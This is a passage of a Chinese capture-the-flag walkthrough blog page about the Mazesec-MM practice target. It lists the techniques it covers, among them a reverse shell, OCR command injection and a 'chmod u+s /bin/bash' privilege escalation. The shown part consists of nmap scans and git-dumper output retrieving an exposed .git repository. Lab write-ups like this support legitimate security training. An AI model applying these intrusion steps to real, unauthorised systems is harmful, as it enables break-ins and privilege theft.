@@ -1,0 +1,754 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/icon.jpg">
+  <link rel="icon" href="/img/icon.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Skyarrow">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="已有的事，后必再有。已行的事，后必再行。日光之下,并无新事。—-&lt;传道书&gt; 1:9  靶机ip:192.168.56.60 难度:简单 涉及内容: 信息收集与枚举： Nmap 端口与服务探测 、域名绑定测试。 Web 安全： Git 源码泄露利用 (git-dumper) 、Git 提交历史审计与凭据恢复 (git log, git diff) 。 图形化界面逃逸： VNC 登录 、">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Mazesec-MM">
+<meta property="og:url" content="http://example.com/2026/04/24/Mazesec-MM/index.html">
+<meta property="og:site_name" content="Skyarrow&#39;s blog">
+<meta property="og:description" content="已有的事，后必再有。已行的事，后必再行。日光之下,并无新事。—-&lt;传道书&gt; 1:9  靶机ip:192.168.56.60 难度:简单 涉及内容: 信息收集与枚举： Nmap 端口与服务探测 、域名绑定测试。 Web 安全： Git 源码泄露利用 (git-dumper) 、Git 提交历史审计与凭据恢复 (git log, git diff) 。 图形化界面逃逸： VNC 登录 、">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2026/04/24/Mazesec-MM/vmware_gRlX8WkYNz.png">
+<meta property="og:image" content="http://example.com/2026/04/24/Mazesec-MM/vmware_TAppVdhfDZ.png">
+<meta property="og:image" content="http://example.com/2026/04/24/Mazesec-MM/vmware_oxFYjk0iUp.png">
+<meta property="og:image" content="http://example.com/2026/04/24/Mazesec-MM/vmware_1XpL4IbSTJ.png">
+<meta property="og:image" content="http://example.com/2026/04/24/Mazesec-MM/vmware_abPEvCUw8c.png">
+<meta property="article:published_time" content="2026-04-24T07:58:06.000Z">
+<meta property="article:modified_time" content="2026-04-24T09:16:34.037Z">
+<meta property="article:author" content="Skyarrow">
+<meta property="article:tag" content="Mazesec">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2026/04/24/Mazesec-MM/vmware_gRlX8WkYNz.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>Mazesec-MM - Skyarrow&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null},"busuanzi":{"enable":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Skyarrow&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>Links</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/card_normal.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Mazesec-MM"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-04-24 15:58" pubdate>
+          April 24, 2026 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.9k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          25 mins
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> views
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Mazesec-MM</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p> 已有的事，后必再有。已行的事，后必再行。日光之下,并无新事。—-&lt;传道书&gt; 1:9</p>
+<hr>
+<p>靶机ip:192.168.56.60</p>
+<p>难度:简单</p>
+<p>涉及内容:</p>
+<p><strong>信息收集与枚举：</strong> Nmap 端口与服务探测 、域名绑定测试。</p>
+<p><strong>Web 安全：</strong> Git 源码泄露利用 (<code>git-dumper</code>) 、Git 提交历史审计与凭据恢复 (<code>git log</code>, <code>git diff</code>) 。</p>
+<p><strong>图形化界面逃逸：</strong> VNC 登录 、利用 XFCE 桌面 Application Finder 绕过受限 Shell (nologin) 执行反弹 Shell 。</p>
+<p><strong>本地信息收集：</strong> 使用 <code>pspy64</code> 监控系统进程与隐藏 Cron 计划任务 。</p>
+<p><strong>权限提升 (Root)：</strong> 审计自定义 Bash 脚本 、利用 OCR 工具 (<code>gocr</code>) 读取图片文本导致的命令注入 、SUID 权限滥用 (<code>chmod u+s /bin/bash</code>) 。</p>
+<p><strong>凭据破解 (横向移动)：</strong> 提取 SSH 私钥 (<code>id_ed25519</code>) 、使用 <code>ssh2john</code> 和 John the Ripper 爆破私钥密码 。</p>
+<hr>
+<p>端口扫描</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─<span class="hljs-comment"># nmap -p- 192.168.56.60</span><br>Starting Nmap <span class="hljs-number">7.98</span> ( <span class="hljs-keyword">https</span>://nmap.org ) <span class="hljs-keyword">at</span> <span class="hljs-number">2026</span><span class="hljs-number">-04</span><span class="hljs-number">-24</span> <span class="hljs-number">08</span>:<span class="hljs-number">02</span> +<span class="hljs-number">0000</span><br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">192.168</span><span class="hljs-number">.56</span><span class="hljs-number">.60</span> (<span class="hljs-number">192.168</span><span class="hljs-number">.56</span><span class="hljs-number">.60</span>)<br>Host is up (<span class="hljs-number">0.00058</span>s latency).<br>Not shown: <span class="hljs-number">65531</span> closed tcp ports (reset)<br>PORT     STATE SERVICE<br><span class="hljs-number">22</span>/tcp   <span class="hljs-built_in">open</span>  ssh<br><span class="hljs-number">80</span>/tcp   <span class="hljs-built_in">open</span>  <span class="hljs-keyword">http</span><br><span class="hljs-number">5901</span>/tcp <span class="hljs-built_in">open</span>  vnc<span class="hljs-number">-1</span><br><span class="hljs-number">6001</span>/tcp <span class="hljs-built_in">open</span>  X11:<span class="hljs-number">1</span><br>MAC Address: <span class="hljs-number">08</span>:<span class="hljs-number">00</span>:<span class="hljs-number">27</span>:A6:D8:<span class="hljs-number">1</span>D (Oracle VirtualBox virtual NIC)<br><br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">3.61</span> <span class="hljs-built_in">seconds</span><br><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs nix">┌──(root㉿kaada)-[<span class="hljs-operator">/</span>home<span class="hljs-operator">/</span>kali<span class="hljs-operator">/</span>Desktop]<br>└─<span class="hljs-comment"># nmap -p- 192.168.56.60 -sC -sV -T4 -A -O</span><br>Starting Nmap <span class="hljs-number">7.98</span> ( https:<span class="hljs-symbol">//nmap.org</span> ) at <span class="hljs-number">202</span>6-<span class="hljs-number">0</span>4-<span class="hljs-number">24</span> <span class="hljs-number">08</span>:<span class="hljs-number">03</span> <span class="hljs-operator">+</span><span class="hljs-number">0000</span><br>Nmap scan report for <span class="hljs-number">192.168</span>.<span class="hljs-number">56.60</span> (<span class="hljs-number">192.168</span>.<span class="hljs-number">56.60</span>)<br>Host is up (<span class="hljs-number">0.00066</span>s latency).<br>Not <span class="hljs-params">shown:</span> <span class="hljs-number">65531</span> closed tcp ports (reset)<br>PORT     STATE SERVICE VERSION<br><span class="hljs-number">22</span><span class="hljs-symbol">/tcp</span>   open  ssh     OpenSSH <span class="hljs-number">8.4</span>p1 Debian <span class="hljs-number">5</span><span class="hljs-operator">+</span>deb11u3 (protocol <span class="hljs-number">2.0</span>)<br>| <span class="hljs-params">ssh-hostkey:</span> <br>|   <span class="hljs-number">3072</span> f6:a3:b6:<span class="hljs-number">78</span>:c4:<span class="hljs-number">62</span>:af:<span class="hljs-number">44</span>:bb:<span class="hljs-number">1</span>a:a0:<span class="hljs-number">0</span>c:<span class="hljs-number">08</span>:<span class="hljs-number">6</span>b:<span class="hljs-number">98</span>:f7 (RSA)<br>|   <span class="hljs-number">256</span> bb:e8:a2:<span class="hljs-number">31</span>:d4:<span class="hljs-number">05</span>:a9:c9:<span class="hljs-number">31</span>:ff:<span class="hljs-number">62</span>:f6:<span class="hljs-number">32</span>:<span class="hljs-number">84</span>:<span class="hljs-number">21</span>:<span class="hljs-number">9</span>d (ECDSA)<br>|_  <span class="hljs-number">256</span> <span class="hljs-number">3</span>b:ae:<span class="hljs-number">34</span>:<span class="hljs-number">64</span>:<span class="hljs-number">4</span>f:a5:<span class="hljs-number">75</span>:b9:<span class="hljs-number">4</span>a:b9:<span class="hljs-number">81</span>:f9:<span class="hljs-number">89</span>:<span class="hljs-number">76</span>:<span class="hljs-number">99</span>:eb (ED25519)<br><span class="hljs-number">80</span><span class="hljs-symbol">/tcp</span>   open  http    Apache httpd <span class="hljs-number">2.4</span>.<span class="hljs-number">62</span> ((Debian))<br>|<span class="hljs-params">_http-server-header:</span> Apache<span class="hljs-symbol">/2.4.62</span> (Debian)<br>|<span class="hljs-params">_http-title:</span> Hi<br>| <span class="hljs-params">http-git:</span> <br>|   <span class="hljs-number">192.168</span>.<span class="hljs-number">56.60</span>:<span class="hljs-number">80</span><span class="hljs-operator">/</span>.git<span class="hljs-symbol">/</span><br>|     Git repository found<span class="hljs-operator">!</span><br>|     Repository <span class="hljs-params">description:</span> Unnamed repository; edit this file &#x27;description&#x27; to name the...<br>|_    Last commit <span class="hljs-params">message:</span> <span class="hljs-number">4</span> <br><span class="hljs-number">5901</span><span class="hljs-symbol">/tcp</span> open  vnc     VNC (protocol <span class="hljs-number">3.8</span>)<br>| <span class="hljs-params">vnc-info:</span> <br>|   Protocol <span class="hljs-params">version:</span> <span class="hljs-number">3.8</span><br>|   Security <span class="hljs-params">types:</span> <br>|     VNC Authentication (<span class="hljs-number">2</span>)<br>|     Tight (<span class="hljs-number">16</span>)<br>|   Tight auth <span class="hljs-params">subtypes:</span> <br>|_    STDV VNCAUTH_ (<span class="hljs-number">2</span>)<br><span class="hljs-number">6001</span><span class="hljs-symbol">/tcp</span> open  X11     (access denied)<br>MAC <span class="hljs-params">Address:</span> <span class="hljs-number">08</span>:<span class="hljs-number">00</span>:<span class="hljs-number">27</span>:A6:D8:<span class="hljs-number">1</span>D (Oracle VirtualBox virtual NIC)<br>Device <span class="hljs-params">type:</span> general purpose|router<br><span class="hljs-params">Running:</span> Linux <span class="hljs-number">4</span>.X|<span class="hljs-number">5</span>.X, MikroTik RouterOS <span class="hljs-number">7</span>.X<br>OS <span class="hljs-params">CPE:</span> cpe:<span class="hljs-operator">/</span>o:linux:linux_kernel:<span class="hljs-number">4</span> cpe:<span class="hljs-operator">/</span>o:linux:linux_kernel:<span class="hljs-number">5</span> cpe:<span class="hljs-operator">/</span>o:mikrotik:routeros:<span class="hljs-number">7</span> cpe:<span class="hljs-operator">/</span>o:linux:linux_kernel:<span class="hljs-number">5.6</span>.<span class="hljs-number">3</span><br>OS <span class="hljs-params">details:</span> Linux <span class="hljs-number">4.15</span> <span class="hljs-operator">-</span> <span class="hljs-number">5.19</span>, OpenWrt <span class="hljs-number">21.02</span> (Linux <span class="hljs-number">5.4</span>), MikroTik RouterOS <span class="hljs-number">7.2</span> <span class="hljs-operator">-</span> <span class="hljs-number">7.5</span> (Linux <span class="hljs-number">5.6</span>.<span class="hljs-number">3</span>)<br>Network <span class="hljs-params">Distance:</span> <span class="hljs-number">1</span> hop<br>Service <span class="hljs-params">Info:</span> <span class="hljs-params">OS:</span> Linux; <span class="hljs-params">CPE:</span> cpe:<span class="hljs-operator">/</span>o:linux:linux_kernel<br><br>TRACEROUTE<br>HOP RTT     ADDRESS<br><span class="hljs-number">1</span>   <span class="hljs-number">0.66</span> ms <span class="hljs-number">192.168</span>.<span class="hljs-number">56.60</span> (<span class="hljs-number">192.168</span>.<span class="hljs-number">56.60</span>)<br><br>OS and Service detection performed. Please report any incorrect results at https:<span class="hljs-operator">//</span>nmap.org<span class="hljs-operator">/</span>submit<span class="hljs-symbol">/</span> .<br>Nmap <span class="hljs-params">done:</span> <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">12.04</span> seconds<br><br></code></pre></td></tr></table></figure>
+
+<p>比较不常见的是开放了5901的VNC端口和6001的X11端口.</p>
+<p>nmap的脚本探测到git泄露,使用git-dumper下载下来</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs awk">┌──(root㉿kaada)-[<span class="hljs-regexp">/home/</span>kali/Desktop]<br>└─<span class="hljs-comment"># git-dumper http://192.168.56.60/.git/ MM</span><br>[-] Testing http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.60</span><span class="hljs-regexp">/.git/</span>HEAD [<span class="hljs-number">200</span>]<br>[-] Testing http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.60</span><span class="hljs-regexp">/.git/</span> [<span class="hljs-number">200</span>]<br>[-] Fetching .git recursively<br>[-] Fetching http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.60</span><span class="hljs-regexp">/.git/</span> [<span class="hljs-number">200</span>]<br>[-] Fetching http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.60</span>/.gitignore [<span class="hljs-number">404</span>]<br>[-] http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.60</span>/.gitignore responded with status code <span class="hljs-number">404</span><br>[-] Fetching http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.60</span><span class="hljs-regexp">/.git/</span>description [<span class="hljs-number">200</span>]<br>[-] Fetching http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.60</span><span class="hljs-regexp">/.git/</span>branches/ [<span class="hljs-number">200</span>]<br>[-] Fetching http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.60</span><span class="hljs-regexp">/.git/i</span>nfo/ [<span class="hljs-number">200</span>]<br>[-] Fetching http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.60</span><span class="hljs-regexp">/.git/</span>COMMIT_EDITMSG [<span class="hljs-number">200</span>]<br>[-] Fetching http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.60</span><span class="hljs-regexp">/.git/</span>config [<span class="hljs-number">200</span>]<br>[-] Fetching http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.60</span><span class="hljs-regexp">/.git/</span>hooks/ [<span class="hljs-number">200</span>]<br>[-] Fetching http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.60</span><span class="hljs-regexp">/.git/i</span>nfo/exclude [<span class="hljs-number">200</span>]<br>[-] Fetching http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.60</span><span class="hljs-regexp">/.git/</span>hooks/commit-msg.sample [<span class="hljs-number">200</span>]<br>[-] Fetching http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.60</span><span class="hljs-regexp">/.git/</span>hooks/applypatch-msg.sample [<span class="hljs-number">200</span>]<br>[-] Fetching http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.60</span><span class="hljs-regexp">/.git/</span>hooks/post-update.sample [<span class="hljs-number">200</span>]<br>[-] Fetching http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.60</span><span class="hljs-regexp">/.git/</span>hooks/pre-applypatch.sample [<span class="hljs-number">200</span>]<br>[-] Fetching http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.60</span><span class="hljs-regexp">/.git/</span>hooks/fsmonitor-watchman.sample [<span class="hljs-number">200</span>]<br>[-] Fetching http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.60</span><span class="hljs-regexp">/.git/</span>refs/ [<span class="hljs-number">200</span>]<br>[-] Fetching http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.60</span><span class="hljs-regexp">/.git/</span>hooks/pre-commit.sample [<span class="hljs-number">200</span>]<br>[-] Fetching http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.60</span><span class="hljs-regexp">/.git/</span>hooks/pre-receive.sample [<span class="hljs-number">200</span>]<br>[-] Fetching http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.60</span><span class="hljs-regexp">/.git/</span>hooks/pre-push.sample [<span class="hljs-number">200</span>]<br>[-] Fetching http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.60</span><span class="hljs-regexp">/.git/</span>hooks/pre-rebase.sample [<span class="hljs-number">200</span>]<br>[-] Fetching http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.60</span><span class="hljs-regexp">/.git/</span>hooks/pre-merge-commit.sample [<span class="hljs-number">200</span>]<br>[-] Fetching http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.60</span><span class="hljs-regexp">/.git/</span>hooks/prepare-commit-msg.sample [<span class="hljs-number">200</span>]<br>[-] Fetching http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.60</span><span class="hljs-regexp">/.git/</span>objects/ [<span class="hljs-number">200</span>]<br>[-] Fetching http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.60</span><span class="hljs-regexp">/.git/</span>refs<span class="hljs-regexp">/heads/</span> [<span class="hljs-number">200</span>]<br>[-] Fetching http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.60</span><span class="hljs-regexp">/.git/</span>refs<span class="hljs-regexp">/tags/</span> [<span class="hljs-number">200</span>]<br>[-] Fetching http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.60</span><span class="hljs-regexp">/.git/</span>hooks/update.sample [<span class="hljs-number">200</span>]<br>[-] Fetching http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.60</span><span class="hljs-regexp">/.git/</span>hooks/push-to-checkout.sample [<span class="hljs-number">200</span>]<br>[-] Fetching http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.60</span><span class="hljs-regexp">/.git/</span>refs<span class="hljs-regexp">/heads/m</span>aster [<span class="hljs-number">200</span>]<br>[-] Fetching http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.60</span><span class="hljs-regexp">/.git/</span>objects<span class="hljs-regexp">/2d/</span> [<span class="hljs-number">200</span>]<br>[-] Fetching http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.60</span><span class="hljs-regexp">/.git/</span>objects<span class="hljs-regexp">/19/</span> [<span class="hljs-number">200</span>]<br>[-] Fetching http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.60</span><span class="hljs-regexp">/.git/</span>objects<span class="hljs-regexp">/67/</span> [<span class="hljs-number">200</span>]<br>[-] Fetching http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.60</span><span class="hljs-regexp">/.git/</span>objects<span class="hljs-regexp">/bd/</span> [<span class="hljs-number">200</span>]<br>[-] Fetching http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.60</span><span class="hljs-regexp">/.git/</span>objects<span class="hljs-regexp">/b8/</span> [<span class="hljs-number">200</span>]<br>[-] Fetching http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.60</span><span class="hljs-regexp">/.git/</span>objects<span class="hljs-regexp">/90/</span> [<span class="hljs-number">200</span>]<br>[-] Fetching http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.60</span><span class="hljs-regexp">/.git/</span>objects<span class="hljs-regexp">/ab/</span> [<span class="hljs-number">200</span>]<br>[-] Fetching http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.60</span><span class="hljs-regexp">/.git/</span>objects<span class="hljs-regexp">/f7/</span> [<span class="hljs-number">200</span>]<br>[-] Fetching http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.60</span><span class="hljs-regexp">/.git/</span>objects<span class="hljs-regexp">/f9/</span> [<span class="hljs-number">200</span>]<br>[-] Fetching http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.60</span><span class="hljs-regexp">/.git/</span>objects<span class="hljs-regexp">/f6/</span> [<span class="hljs-number">200</span>]<br>[-] Fetching http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span 